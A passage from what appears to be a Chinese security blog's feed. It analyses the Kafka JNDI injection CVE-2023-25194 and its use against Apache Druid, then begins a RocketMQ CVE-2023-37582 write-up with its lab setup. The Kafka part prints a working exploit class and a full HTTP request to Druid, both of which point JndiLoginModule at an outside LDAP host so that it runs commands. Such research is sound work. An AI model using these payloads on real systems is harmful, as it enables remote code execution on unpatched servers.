class="string">&quot;192.168.1.176:9092&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;group.id&quot;</span>, <span class="string">&quot;test_group&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;enable.auto.commit&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;auto.commit.interval.ms&quot;</span>, <span class="string">&quot;1000&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;key.deserializer&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;value.deserializer&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        <span class="comment">// sasl.jaas.config的配置</span></span><br><span class="line">        props.setProperty(<span class="string">&quot;sasl.jaas.config&quot;</span>, <span class="string">&quot;org.apache.kafka.common.security.plain.PlainLoginModule required username=\&quot;usn\&quot; password=\&quot;pwd\&quot;;&quot;</span>);</span><br><span class="line">        props.setProperty(<span class="string">&quot;security.protocol&quot;</span>, <span class="string">&quot;SASL_PLAINTEXT&quot;</span>);</span><br><span class="line">        props.setProperty(<span class="string">&quot;sasl.mechanism&quot;</span>, <span class="string">&quot;PLAIN&quot;</span>);</span><br><span class="line"></span><br><span class="line">        KafkaConsumer&lt;String, String&gt; consumer = <span class="keyword">new</span> <span class="title class_">KafkaConsumer</span>&lt;&gt;(props);</span><br><span class="line">        consumer.subscribe(Arrays.asList(<span class="string">&quot;topic_name&quot;</span>));</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">                ConsumerRecords&lt;String, String&gt; records = consumer.poll(Duration</span><br><span class="line">                        .ofMillis(<span class="number">100</span>));</span><br><span class="line">                <span class="keyword">for</span> (ConsumerRecord&lt;String, String&gt; record : records)</span><br><span class="line">                    System.out.printf(<span class="string">&quot;offset = %d, partition = %d, key = %s, value = %s%n&quot;</span>,</span><br><span class="line">                            record.offset(), record.partition(), record.key(), record.value());</span><br><span class="line">          </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>生产者</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestProduce</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line"></span><br><span class="line">        props.put(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;192.168.1.176:9092&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;acks&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;retries&quot;</span>, <span class="number">3</span>);</span><br><span class="line">        props.put(<span class="string">&quot;batch.size&quot;</span>, <span class="number">16384</span>);</span><br><span class="line">        props.put(<span class="string">&quot;buffer.memory&quot;</span>, <span class="number">33554432</span>);</span><br><span class="line">        props.put(<span class="string">&quot;linger.ms&quot;</span>, <span class="number">10</span>);</span><br><span class="line">        props.put(<span class="string">&quot;key.serializer&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;value.serializer&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//sasl</span></span><br><span class="line">        props.setProperty(<span class="string">&quot;sasl.jaas.config&quot;</span>, <span class="string">&quot;org.apache.kafka.common.security.plain.PlainLoginModule required username=\&quot;usn\&quot; password=\&quot;pwd\&quot;;&quot;</span>);</span><br><span class="line">        props.setProperty(<span class="string">&quot;security.protocol&quot;</span>, <span class="string">&quot;SASL_PLAINTEXT&quot;</span>);</span><br><span class="line">        props.setProperty(<span class="string">&quot;sasl.mechanism&quot;</span>, <span class="string">&quot;PLAIN&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Producer&lt;String, String&gt; producer = <span class="keyword">new</span> <span class="title class_">KafkaProducer</span>&lt;&gt;(props);</span><br><span class="line">        </span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * ProducerRecord 参数解析 第一个：topic_name为生产者 topic名称,</span></span><br><span class="line"><span class="comment">        * 第二个：对于生产者kafka2.0需要你指定一个key</span></span><br><span class="line"><span class="comment">        * ,在企业应用中，我们一般会把他当做businessId来用，比如订单ID,用户ID等等。 第三个：消息的主要信息</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">              producer.send(<span class="keyword">new</span> <span class="title class_">ProducerRecord</span>&lt;String, String&gt;(<span class="string">&quot;topic_name&quot;</span>, Integer.toString(i), <span class="string">&quot;message info&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞触发点其实是在 <code>com.sun.security.auth.module.JndiLoginModule#attemptAuthentication</code> 方法处</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/lookup.png" class><p>理顺逻辑很容易构造出 EXP</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.kafka.clients.consumer.KafkaConsumer;</span><br><span class="line">import org.apache.kafka.clients.producer.KafkaProducer;</span><br><span class="line"></span><br><span class="line">import java.util.Properties;</span><br><span class="line"></span><br><span class="line">public class EXP &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Properties properties = new Properties();</span><br><span class="line">        properties.put(&quot;bootstrap.servers&quot;, &quot;127.0.0.1:1234&quot;);</span><br><span class="line">        properties.put(&quot;key.deserializer&quot;, &quot;org.apache.kafka.common.serialization.StringDeserializer&quot;);</span><br><span class="line">        properties.put(&quot;value.deserializer&quot;,&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;);</span><br><span class="line"></span><br><span class="line">        properties.put(&quot;sasl.mechanism&quot;, &quot;PLAIN&quot;);</span><br><span class="line">        properties.put(&quot;security.protocol&quot;, &quot;SASL_SSL&quot;);</span><br><span class="line">        properties.put(&quot;sasl.jaas.config&quot;, &quot;com.sun.security.auth.module.JndiLoginModule &quot; +</span><br><span class="line">                &quot;required &quot; +</span><br><span class="line">                &quot;user.provider.url=\&quot;ldap://124.222.21.138:1389/Basic/Command/Base64/Q2FsYw==\&quot; &quot; +</span><br><span class="line">                &quot;useFirstPass=\&quot;true\&quot; &quot; +</span><br><span class="line">                &quot;group.provider.url=\&quot;xxx\&quot;;&quot;);</span><br><span class="line"></span><br><span class="line">        KafkaConsumer&lt;String, String&gt; kafkaConsumer = new KafkaConsumer&lt;&gt;(properties);</span><br><span class="line">        kafkaConsumer.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/EXP.png" class><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>前面有非常多的数据处理与赋值，这里就跳过了，直接看 <code>org.apache.kafka.clients.consumer.KafkaConsumer</code> 类的第 177 行 <code>ClientUtils.createChannelBuilder()</code>，跟进。</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/createChannelBuilder.png" class><p>继续跟进，这里会先判断 SASL 模式是否开启，只有开启了才会往下跟进到 <code>create()</code> 方法</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/SASL_SSL.png" class><p>跟进 <code>create()</code> 方法，做完客户端的判断和安全协议的判断之后，调用了 <code>loadClientContext()</code> 方法，跟进，发现其中还是加载了一些配置。</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/loadClientContext.png" class><p>跳出来，跟进 <code>((ChannelBuilder)channelBuilder).configure(configs)</code> 方法，最后跟到 <code>org.apache.kafka.common.security.authenticator.LoginManager</code> 的构造函数。</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/LoginManager.png" class><p>跟进 <code>login()</code> 方法，此处 <code>new LoginContext()</code>，随后调用 <code>login()</code> 方法，跟进</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/loginContext.png" class><p>这里会调用 <code>JndiLoginModule</code> 的 <code>initialize()</code> 方法</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/moduleStack.png" class><p>初始化完成之后，此处调用 <code>JndiLoginModule</code> 的 <code>login()</code> 方法，最后到 <code>JndiLoginModule</code> 的 <code>attemptAuthentication()</code> 方法，完成 Jndi 注入。</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/down.png" class><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在 3.4.0 版本中, 官方的修复方式是增加了对 <code>JndiLoginModule</code> 的黑名单</p><p><code>org.apache.kafka.common.security.JaasContext#throwIfLoginModuleIsNotAllowed</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">throwIfLoginModuleIsNotAllowed</span><span class="params">(AppConfigurationEntry appConfigurationEntry)</span> &#123;</span><br><span class="line">    Set&lt;String&gt; disallowedLoginModuleList = (Set)Arrays.stream(System.getProperty(<span class="string">&quot;org.apache.kafka.disallowed.login.modules&quot;</span>, <span class="string">&quot;com.sun.security.auth.module.JndiLoginModule&quot;</span>).split(<span class="string">&quot;,&quot;</span>)).map(String::trim).collect(Collectors.toSet());</span><br><span class="line">    <span class="type">String</span> <span class="variable">loginModuleName</span> <span class="operator">=</span> appConfigurationEntry.getLoginModuleName().trim();</span><br><span class="line">    <span class="keyword">if</span> (disallowedLoginModuleList.contains(loginModuleName)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(loginModuleName + <span class="string">&quot; is not allowed. Update System property &#x27;&quot;</span> + <span class="string">&quot;org.apache.kafka.disallowed.login.modules&quot;</span> + <span class="string">&quot;&#x27; to allow &quot;</span> + loginModuleName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Apache-Druid-RCE-via-Kafka-Clients"><a href="#Apache-Druid-RCE-via-Kafka-Clients" class="headerlink" title="Apache Druid RCE via Kafka Clients"></a>Apache Druid RCE via Kafka Clients</h2><p>影响版本：Apache Druid &lt;&#x3D; 25.0.0</p><p>Apache Druid 是一个实时分析型数据库, 它支持从 Kafka 中导入数据 (Consumer) , 因为目前最新版本的 Apache Druid 25.0.0 所用 <code>kafka-clients</code> 依赖的版本仍然是 3.3.1, 即存在漏洞的版本, 所以如果目标 Druid 存在未授权访问 (默认配置无身份认证), 则可以通过这种方式实现 RCE</p><p>有意思的是, Druid 包含了 <code>commons-beanutils:1.9.4</code> 依赖, 所以即使在高版本 JDK 的情况下也能通过 LDAP JNDI 打反序列化 payload 实现 RCE</p><ul><li>漏洞 UI 处触发点：Druid Web Console - Load data - Apache Kafka</li></ul><p>在这里可以加载 Kafka 的 Data，其中可以修改配置项 <code>sasl.jaas.config</code>，由此构造 Payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">http://124.222.21.138:8888/druid/indexer/v1/sampler?for=connect</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>124.222.21.138:8888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>916</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://124.222.21.138:8888</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://124.222.21.138:8888/unified-console.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ja;q=0.5,zh-TW;q=0.4,no;q=0.3,ko;q=0.2</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-swift">&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,<span class="string">&quot;spec&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,<span class="string">&quot;ioConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>,<span class="string">&quot;consumerProperties&quot;</span>:&#123;<span class="string">&quot;bootstrap.servers&quot;</span>:<span class="string">&quot;127.0.0.1:1234&quot;</span>,</span></span><br><span class="line"><span class="language-swift"><span class="string">&quot;sasl.mechanism&quot;</span>:<span class="string">&quot;SCRAM-SHA-256&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;security.protocol&quot;</span>:<span class="string">&quot;SASL_SSL&quot;</span>,</span></span><br><span class="line"><span class="language-swift">                <span class="string">&quot;sasl.jaas.config&quot;</span>:<span class="string">&quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url=<span class="subst">\&quot;</span>ldap://124.222.21.138:1389/Basic/Command/base64/aWQgPiAvdG1wL3N1Y2Nlc3M=<span class="subst">\&quot;</span> useFirstPass=<span class="subst">\&quot;</span>true<span class="subst">\&quot;</span> serviceName=<span class="subst">\&quot;</span>x<span class="subst">\&quot;</span> debug=<span class="subst">\&quot;</span>true<span class="subst">\&quot;</span> group.provider.url=<span class="subst">\&quot;</span>xxx<span class="subst">\&quot;</span>;&quot;</span></span></span><br><span class="line"><span class="language-swift">&#125;,<span class="string">&quot;topic&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;useEarliestOffset&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;inputFormat&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;regex&quot;</span>,<span class="string">&quot;pattern&quot;</span>:<span class="string">&quot;([<span class="subst">\\</span>s<span class="subst">\\</span>S]*)&quot;</span>,<span class="string">&quot;listDelimiter&quot;</span>:<span class="string">&quot;56616469-6de2-9da4-efb8-8f416e6e6965&quot;</span>,<span class="string">&quot;columns&quot;</span>:[<span class="string">&quot;raw&quot;</span>]&#125;&#125;,<span class="string">&quot;dataSchema&quot;</span>:&#123;<span class="string">&quot;dataSource&quot;</span>:<span class="string">&quot;sample&quot;</span>,<span class="string">&quot;timestampSpec&quot;</span>:&#123;<span class="string">&quot;column&quot;</span>:<span class="string">&quot;!!!_no_such_column_!!!&quot;</span>,<span class="string">&quot;missingValue&quot;</span>:<span class="string">&quot;1970-01-01T00:00:00Z&quot;</span>&#125;,<span class="string">&quot;dimensionsSpec&quot;</span>:&#123;&#125;,<span class="string">&quot;granularitySpec&quot;</span>:&#123;<span class="string">&quot;rollup&quot;</span>:<span class="literal">false</span>&#125;&#125;,<span class="string">&quot;tuningConfig&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;kafka&quot;</span>&#125;&#125;,<span class="string">&quot;samplerConfig&quot;</span>:&#123;<span class="string">&quot;numRows&quot;</span>:<span class="number">500</span>,<span class="string">&quot;timeoutMs&quot;</span>:<span class="number">15000</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/druidAttack.png" class><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/success-25194.png" class><p>在 <code>druid-kafka-indexing-service</code> 这个 extension 中可以看到实例化 KafkaConsumer 的过程</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/KafkaRecordSupplier.png" class><p>而上面第 286 行的 <code>addConsumerPropertiesFromConfig()</code> 正是进行了动态修改配置</p><p>Apache Druid 26.0.0 更新了 kafka 依赖的版本</p><p><a class="link" href="https://github.com/apache/druid/blob/26.0.0/pom.xml#L79">https://github.com/apache/druid/blob/26.0.0/pom.xml#L79<i class="fas fa-external-link-alt"></i></a></p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/druidNewVersion.png" class>]]></content>
    
    
    <summary type="html">CVE-2023-25194 漏洞分析</summary>
    
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-37582 Apache RocketMQ RCE 漏洞分析</title>
    <link href="https://drun1baby.github.io/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://drun1baby.github.io/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-11-21T03:42:50.000Z</published>
    <updated>2023-11-27T01:51:33.370Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-37582-漏洞分析"><a href="#CVE-2023-37582-漏洞分析" class="headerlink" title="CVE-2023-37582 漏洞分析"></a>CVE-2023-37582 漏洞分析</h1><p>调试端口</p><p>10011 broker<br>10012 namsrv</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>RocketMQ 是一个开源的分布式消息中间件，NameServer 为 Producer 和 Consumer 节点提供路由信息的组件。</p><p>由于 CVE-2023-33246 的补丁中并未对 DefaultRequestProcessor#updateConfig 方法中的 configStorePath 属性值进行过滤，当 NameServer 地址暴露在公网并且缺乏权限校验，未经授权的攻击者可 payload 注入到 configStorePath 中，调用 NameServer 的更新配置函数将恶意文件上传到 RocketMQ 服务器中实现远程代码执行。</p><h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>Apache RocketMQ &lt;&#x3D; 5.1.1<br>Apache RocketMQ &lt;&#x3D; 4.9.6</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>先 wget 需要的东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://archive.apache.org/dist/rocketmq/5.1.1/rocketmq-all-5.1.1-bin-release.zip</span><br></pre></td></tr></table></figure><p>然后 <strong>Dockerfile</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>u342-jdk</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s/deb.debian.org/mirrors.aliyun.com/g&#x27;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt install vim netcat iputils-ping net-tools cron -y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    wget https://mirrors.tuna.tsinghua.edu.cn/apache/rocketmq/5.1.1/rocketmq-all-5.1.1-bin-release.zip &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    unzip rocketmq-all-5.1.1-bin-release.zip</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /rocketmq-all-5.1.1-bin-release/bin/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>docker-compose.yml</strong></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">namesrv:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqnamesrv</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">9876</span><span class="string">:9876</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10012</span><span class="string">:10010</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT=-Xdebug</span> <span class="string">-Xrunjdwp:transport=dt_socket,address=10010,server=y,suspend=n</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">sh</span> <span class="string">mqnamesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">broker:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqbroker</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10909</span><span class="string">:10909</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10911</span><span class="string">:10911</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10912</span><span class="string">:10912</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10011</span><span class="string">:10010</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT=-Xdebug</span> <span class="string">-Xrunjdwp:transport=dt_socket,address=10010,server=y,suspend=n</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">sh</span> <span class="string">mqbroker</span> <span class="string">-n</span> <span class="string">namesrv:9876</span> <span class="string">-c</span> <span class="string">../conf/broker.conf</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">namesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">dashboard:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">apacherocketmq/rocketmq-dashboard</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmqdashboard</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8080</span><span class="string">:8080</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">JAVA_OPTS:</span> <span class="string">&quot;-Drocketmq.namesrv.addr=namesrv:9876&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">namesrv</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">test:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">rmq_test</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT_EXT=-Xms1g</span> <span class="string">-Xmx1g</span> <span class="string">-Xmn512m</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">tail</span> <span class="string">-f</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其实这里用之前 CVE-2023-33246 的环境也可以，但是最好是用 4.x 的，下载环境需要一段时间</p><h2 id="漏洞复现与分析"><a href="#漏洞复现与分析" class="headerlink" title="漏洞复现与分析"></a>漏洞复现与分析</h2><p>这个漏洞本质上是 CVE-2023-33246 的补丁绕过，或者也可以说根本没有做什么防护，先来看 diff</p><p><a class="link" href="https://github.com/apache/rocketmq/commit/fb1c67d536c95ec7bd5904e61b9d97c4c2ee5a3d">https://github.com/apache/rocketmq/commit/fb1c67d536c95ec7bd5904e61b9d97c4c2ee5a3d<i class="fas fa-external-link-alt"></i></a></p><img src="/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/diff.png" class><p>很简单的 diff，只是把 <code>configStorePathName</code> 改成了 <code>configStorePath</code></p><p>上一次在分析 CVE-2023-33246 的时候，我抓过一个流量包，其中的内容就是在 CVE-2023-33246 中的 rocketmq 协议。</p><p>拿其中的一段 TCP 流量出来说</p><img 